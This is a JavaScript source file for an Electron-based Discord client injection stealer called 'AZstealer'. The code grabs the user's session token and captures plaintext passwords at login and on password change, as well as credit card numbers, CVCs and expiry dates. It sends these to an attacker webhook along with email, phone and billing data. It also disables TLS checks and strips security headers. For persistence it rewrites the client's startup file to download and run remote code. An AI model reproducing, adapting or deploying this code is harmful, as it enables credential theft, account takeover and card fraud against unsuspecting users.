CONFIG_OBF
;process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

const fs = require("fs")
const electron = require("electron")
const https = require("https");
const queryString = require("querystring")

var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
var doTheLogOut = fs.existsSync("./yamete.az") ? true : false

async function execScript(str) {
    var window = electron.BrowserWindow.getAllWindows()[0]
    var script = await window.webContents.executeJavaScript(str, true)
    return script || null

}

const makeEmbed = async ({
    title,
    fields,
    image,
    thumbnail,
    description
}) => {
    var params = {
        username: "AZstealer",
        content: "",
        embeds: [{
            title: title,
            color: config["embed-color"],
            fields: fields,
            description: description ?? "",
            author: {
                name: "AZstealer"
            },
            footer: {
                text: "AZstealer | https://t.me/azizisblack"
            },

        }]
    };

    if (image) params.embeds[0].image = {
        url: image
    }
    if (thumbnail) params.embeds[0].thumbnail = {
        url: thumbnail
    }
    return params
}
const getIP = async () => {
    var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
    return json.ip
}

const getURL = async (url, token) => {
    var c = await execScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`)
    return c
}

const getGifOrPNG = async (url) => {
    var tt = [".gif?size=512", ".png?size=512"]

    var headers = await new Promise(resolve => {
        https.get(url, res => resolve(res.headers))
    })
    var type = headers["content-type"]
    if (type == "image/gif") return url + tt[0]
    else return url + tt[1]
}

const GetBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 64 == (64 & e) && (n += "<:bravery:874750808388952075> "), 128 == (128 & e) && (n += "<:brilliance:874750808338608199> "), 256 == (256 & e) && (n += "<:balance:874750808267292683> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
}
const GetRBadges = (e) => {
    var n = "";
    return 1 == (1 & e) && (n += "<:staff:891346298932981783> "), 2 == (2 & e) && (n += "<:partner:918207395279273985> "), 4 == (4 & e) && (n += "<:mm_iconHypeEvents:898186057588277259> "), 8 == (8 & e) && (n += "<:bughunter_1:874750808426692658> "), 512 == (512 & e) && (n += "<:early:944071770506416198> "), 16384 == (16384 & e) && (n += "<:bughunter_2:874750808430874664> "), 4194304 == (4194304 & e) && (n += "<:activedev:1041634224253444146> "), 131072 == (131072 & e) && (n += "<:mm_IconBotDev:898181029737680896> "), "" == n && (n = ":x:"), n
}

const GetNSFW = (bouki) => {
    switch (bouki) {
        case true:
            return ":underage: `NSFW Allowed`"
        case false:
            return ":underage: `NSFW Not Allowed`"
        default:
            return "Idk bro you got me"
    }
}
const GetA2F = (bouki) => {
    switch (bouki) {
        case true:
            return ":lock: `A2F Enabled`"
        case false:
            return ":lock: `A2F Not Enabled`"
        default:
            return "Idk bro you got me"
    }
}


const parseFriends = friends => {
    var real = friends.filter(x => x.type == 1)
    var rareFriends = ""
    for (var friend of real) {
        var badges = GetRBadges(friend.user.public_flags)
        if (badges !== ":x:") rareFriends += `${badges} ${friend.user.username}#${friend.user.discriminator}\n`
    }
    if (!rareFriends) rareFriends = "No Rare Friends"
    return {
        len: real.length,
        badges: rareFriends
    }
}

const parseBilling = billings => {
    var Billings = ""
    billings.forEach(res => {
        if (res.invalid) return
        switch (res.type) {
            case 1:
                Billings += ":heavy_check_mark: :credit_card:"
                break
            case 2:
                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
        }
    })
    if (!Billings) Billings = ":x:"
    return Billings
}

const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))

const GetNitro = r => {
    switch (r.premium_type) {
        default:
            return ":x:"
        case 1:
            return "<:946246402105819216:962747802797113365>"
        case 2:
            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
            var now = new Date(Date.now())
            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
            var b = [2, 3, 6, 9, 12, 15, 18, 24]
            var r = []
            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
            var i = 0
            for (var p of r) p > 0 ? "" : i++
            return "<:946246402105819216:962747802797113365> " + arr[i]
    }
}

const post = async (params) => {
    params = JSON.stringify(params)
    var token = await execScript(tokenScript)
    var n = JSON.stringify({
        data: params,
        token: token
    });
    [config.webhook].forEach(res => {
        const url = new URL(res);
        const options = {
            host: url.hostname,
            port: url.port,
            path: url.pathname,
            method: 'POST',
            headers: {
                "Content-Type": "application/json"
            }
        }
        const req = https.request(options);
        req.on("error", (err) => {
            console.log(err);
        });
        req.write(params);
        req.end();
    })

}
const FirstTime = async () => {
    if (doTheLogOut) return false
    var token = await execScript(tokenScript)
    if (config['init-notify'] !== "true") return true
    if (fs.existsSync(__dirname + "/az")) fs.rmdirSync(__dirname + "/az")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Thanks for using AZStealer",
        })
    } else {
        var user = await getURL("https://discord.com/api/v8/users/@me", token)
        var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
        var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
        var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

        var Billings = parseBilling(billing)
        var Friends = parseFriends(friends)
        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png"
        if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png"

        userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
        userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
        var params = await makeEmbed({
            title: "Thanks for using AZStealer",
            description: `${user.username}'s account`,
            fields: [{
                name: ":mag_right: **User ID**",
                value: `\`${user.id}\``,
                inline: true
            }, {
                name: ":bust_in_silhouette: **Username**",
                value: `\`${user.username}#${user.discriminator}\``,
                inline: true
            }, {
                name: ":e_mail: **Email**",
                value: `\`${user.email}\``,
                inline: false
            }, {
                name: ":mobile_phone: **Phone**",
                value: `\`${user.phone ?? "None"}\``,
                inline: false
            }, {
                name: ":pushpin: **Badges**",
                value: `${GetBadges(user.flags)}`,
                inline: true
            }, {
                name: ":sparkles: **Nitro**",
                value: `${GetNitro(Nitro)}`,
                inline: true
            }, {
                name: "**Billing**",
                value: `${Billings}`,
                inline: false
            }, {
                name: "**Token**",
                value: `\`\`\`${token}\`\`\``,
                inline: false
            }],
            thumbnail: userAvatar
        })
        var params2 = await makeEmbed({
            title: `Total Friends (${Friends.len})`,
            color: config['embed-color'],
            description: Friends.badges,
            thumbnail: userAvatar
        })

        params.embeds.push(params2.embeds[0])
    }
    await post(params)
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Thanks for using AZ-stealer (First LogOut)",
            })
        } else {
            var user = await getURL("https://discord.com/api/v8/users/@me", token)
            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
            var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

            var Billings = parseBilling(billing)
            var Friends = parseFriends(friends)
            if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png"
            if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png"

            userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Thanks for using AZstealer (LogOut)",
                description: `${user.username}'s account`,
                fields: [{
                    name: ":mag_right: **User ID**",
                    value: `\`${user.id}\``,
                    inline: true
                }, {
                    name: ":bust_in_silhouette: **Username**",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: true
                }, {
                    name: ":e_mail: **Email**",
                    value: `\`${user.email}\``,
                    inline: false
                }, {
                    name: ":mobile_phone: **Phone**",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: false
                }, {
                    name: ":pushpin: **Badges**",
                    value: `${GetBadges(user.flags)}`,
                    inline: true
                }, {
                    name: ":sparkles: **Nitro**",
                    value: `${GetNitro(Nitro)}`,
                    inline: true
                }, {
                    name: "**Billing**",
                    value: `${Billings}`,
                    inline: false
                }, {
                    name: "**Token**",
                    value: `\`\`\`${token}\`\`\``,
                    inline: false
                }],
                thumbnail: userAvatar
            })
            var params2 = await makeEmbed({
                title: `Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
        }
        fs.writeFileSync("./yamete.blaze", "LogOut")
        await execScript(logOutScript)
        doTheLogOut = true
        await post(params)
    }
    return false
}

const path = (function () {
    var appPath = electron.app.getAppPath().replace(/\\/g, "/").split("/")
    appPath.pop()
    appPath = appPath.join("/")
    var appName = electron.app.getName()
    return {
        appPath,
        appName
    }
}())

const checUpdate = () => {
    var {
        appPath,
        appName
    } = path

    var ressource = `${appPath}/app`
    var indexFile = __filename.replace(/\\/g, "/")
    var betterDiscord = `${process.env.appdata.replace(/\\/g, "/")}/betterdiscord/data/betterdiscord.asar`
    var package = `${ressource}/package.json`
    var index = `${ressource}/index.js`

    if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
    fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)

    var script = `const fs = require("fs"), https = require("https")
var index = "${indexFile}"
var betterDiscord = "${betterDiscord}"
var bouki = fs.readFileSync(index).toString()
if (bouki == "module.exports = require('./core.asar');") init()
function init() {
    https.get("${config.injection_url}", res => {
        var chunk = ""
        res.on("data", data => chunk += data)
        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
    }).on("error", (err) => setTimeout(init(), 10000));
}
require("${appPath}/app.asar")
if (fs.existsSync(betterDiscord)) require(betterDiscord)`

    fs.writeFileSync(index, script)
    if (!doTheLogOut) execScript(logOutScript)
    return
}
electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
    await electron.app.whenReady();
    await FirstTime()
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({
        cancel: true
    })

    checUpdate()
    callback({})
})

electron.session.defaultSession.webRequest.onHeadersReceived((request, callback) => {
    delete request.responseHeaders['content-security-policy']
    delete request.responseHeaders['content-security-policy-report-only']
    callback({
        responseHeaders: {
            ...request.responseHeaders,
            'Access-Control-Allow-Headers': '*',
        },
    })
})

electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    if (!["POST", "PATCH"].includes(request.method)) return
    if (request.statusCode !== 200) return
    try {
        var data = JSON.parse(request.uploadData[0].bytes)
    } catch (err) {
        var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
    }
    var token = await execScript(tokenScript)
    var ip = await getIP()
    var user = await getURL("https://discord.com/api/v8/users/@me", token)
    var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
    var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
    var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);

    if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png"
    if (!user.banner) var userBanner = "https://cdn.discordapp.com/attachments/1063813362380701736/1077635893231370331/lodho.png"

    userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
    userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
    var Billings = parseBilling(billing)
    var Friends = parseFriends(friends)

    switch (true) {
        case request.url.endsWith("login"):
            var password = data.password
            var params = await makeEmbed({
                title: "Thanks for using AZstealer (Login)",
                description: `${user.username}'s account`,
                color: config['embed-color'],
                fields: [{
                    name: ":mag_right: **User ID**",
                    value: `\`${user.id}\``,
                    inline: true
                }, {
                    name: ":bust_in_silhouette: **Username**",
                    value: `\`${user.username}#${user.discriminator}\``,
                    inline: true
                }, {
                    name: ":e_mail: **Email**",
                    value: `\`${user.email}\``,
                    inline: false
                }, {
                    name: ":key: **Password**",
                    value: `\`${password}\``,
                    inline: true
                }, {
                    name: ":mobile_phone: **Phone**",
                    value: `\`${user.phone ?? "None"}\``,
                    inline: false
                }, {
                    name: ":pushpin: **Badges**",
                    value: `${GetBadges(user.flags)}`,
                    inline: true
                }, {
                    name: ":sparkles: **Nitro**",
                    value: `${GetNitro(Nitro)}`,
                    inline: true
                }, {
                    name: "**Billing**",
                    value: `${Billings}`,
                    inline: false
                }, {
                    name: "**Token**",
                    value: `\`\`\`${token}\`\`\``,
                    inline: false
                }],

                thumbnail: userAvatar,
            })

            var params2 = await makeEmbed({
                title: `Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
        
            await post(params)
            break
        case request.url.endsWith("users/@me"):
            if (!data.password) return
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Thanks for using AZStealer (Password Changed)",
                    description: `${user.username}'s account`,
                    color: config['embed-color'],
                    fields: [{
                        name: ":mag_right: **User ID**",
                        value: `\`${user.id}\``,
                        inline: true
                    }, {
                        name: ":bust_in_silhouette: **Username**",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: true
                    }, {
                        name: ":e_mail: **Email**",
                        value: `\`${user.email}\``,
                        inline: false
                    }, {
                        name: ":key: **Old Password**",
                        value: `\`${data.password}\``,
                        inline: true
                    }, {
                        name: ":key: **New Password**",
                        value: `\`${data.new_password}\``,
                        inline: true
                    }, {
                        name: ":mobile_phone: **Phone**",
                        value: `\`${user.phone ?? "None"}\``,
                        inline: false
                    }, {
                        name: ":pushpin: **Badges**",
                        value: `${GetBadges(user.flags)}`,
                        inline: true
                    }, {
                        name: ":sparkles: **Nitro**",
                        value: `${GetNitro(Nitro)}`,
                        inline: true
                    }, {
                        name: "**Billing**",
                        value: `${Billings}`,
                        inline: false
                    }, {
                        name: "**Token**",
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    }, ],

                    thumbnail: userAvatar,
                })

                var params2 = await makeEmbed({
                    title: `Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])
            
                await post(params)
            }
            if (data.email) {
                var params = await makeEmbed({
                    title: "Thanks for using AZStealer (Email Changed)",
                    description: `${user.username}'s account`,
                    color: config['embed-color'],
                    fields: [{
                        name: ":mag_right: **User ID**",
                        value: `\`${user.id}\``,
                        inline: true
                    }, {
                        name: ":bust_in_silhouette: **Username**",
                        value: `\`${user.username}#${user.discriminator}\``,
                        inline: true
                    }, {
                        name: ":e_mail: **New Email**",
                        value: `\`${user.email}\``,
                        inline: false
                    }, {
                        name: ":key: **Password**",
                        value: `\`${data.password}\``,
                        inline: true
                    }, {
                        name: ":mobile_phone: **Phone**",
                        value: `\`${user.phone ?? "None"}\``,
                        inline: false
                    }, {
                        name: ":pushpin: **Badges**",
                        value: `${GetBadges(user.flags)}`,
                        inline: true
                    }, {
                        name: ":sparkles: **Nitro**",
                        value: `${GetNitro(Nitro)}`,
                        inline: true
                    }, {
                        name: "**Billing**",
                        value: `${Billings}`,
                        inline: false
                    }, {
                        name: "**Token**",
                        value: `\`\`\`${token}\`\`\``,
                        inline: false
                    }, ],

                    thumbnail: userAvatar,
                })

                var params2 = await makeEmbed({
                    title: `Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])
            
                await post(params)
            }
            break
        case request.url.endsWith("tokens"):
            var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]

            var params = await makeEmbed({
                title: "Thanks for using AZStealer (CreditCard Added)",
                description: `
                **Username**\n\`\`\`${user.username}#${user.discriminator}\`\`\`\n
                **ID**\n\`\`\`${user.id}\`\`\`\n
                **Credit Card Number**\n\`\`\`${CardNumber}\`\`\`\n
                **Credit Card Expiration**\n\`\`\`${month}/${year}\`\`\`\n
                **CVC**\n\`\`\`${CardCVC}\`\`\`\n
                **Token** \n\`\`\`${token}\`\`\``,
                thumbnail: userAvatar,
            })

            var params2 = await makeEmbed({
                title: `Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
            await post(params)
            break
    }
})
module.exports = require("./core.asar")
